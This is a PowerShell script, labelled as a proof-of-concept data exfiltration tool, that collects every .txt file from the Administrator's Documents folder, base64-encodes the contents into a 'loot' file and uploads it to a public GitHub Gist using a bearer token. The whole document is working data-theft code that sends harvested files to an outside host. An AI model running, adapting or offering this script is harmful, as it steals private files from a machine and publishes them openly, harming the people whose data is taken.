[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$token = "__TOKEN__"
$docPath = 'C:\Users\Administrator\Documents'
$outPath = 'C:\Windows\Temp\loot_b64.txt'
$logPath = 'C:\Windows\Temp\upload_success.log'

Write-Host "[*] Collecting txt files from Documents folder..."

try {
    $txtFiles = Get-ChildItem -Path $docPath -Filter *.txt | ForEach-Object {
        "`n----- $($_.Name) -----`n" + (Get-Content $_.FullName -Raw)
    }
    $allText = $txtFiles -join "`n"

    if (-not [string]::IsNullOrWhiteSpace($allText)) {
        Write-Host "[+] Text content collected. Encoding to Base64..."
        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($allText))
        Set-Content -Path $outPath -Value $b64
        Write-Host "[+] Base64 output saved to: $outPath"

        Write-Host "[*] Uploading to GitHub Gist..."
        $body = @{
            description = 'POC Data Exfiltration'
            public      = $true
            files       = @{
                'loot_b64.txt' = @{
                    content = $b64
                }
            }
        } | ConvertTo-Json -Depth 10

        Write-Host "[*] Sending upload request..."
        $response = Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Body $body -Headers @{
            Authorization = "Bearer $token"
            "User-Agent"  = "AutoUploadScript"
        }

        Add-Content -Path $logPath -Value "[+] Upload Success: $($response.html_url)"
        Write-Host "[+] Upload completed: $($response.html_url)"
    }
    else {
        Write-Host "[!] No txt files found. Skipping upload."
    }
}
catch {
    Add-Content -Path $logPath -Value "[!] Upload Failed: $_"
    Write-Host "[!] Upload failed: $_"
}

Write-Host "[*] upload_gist.ps1 completed."
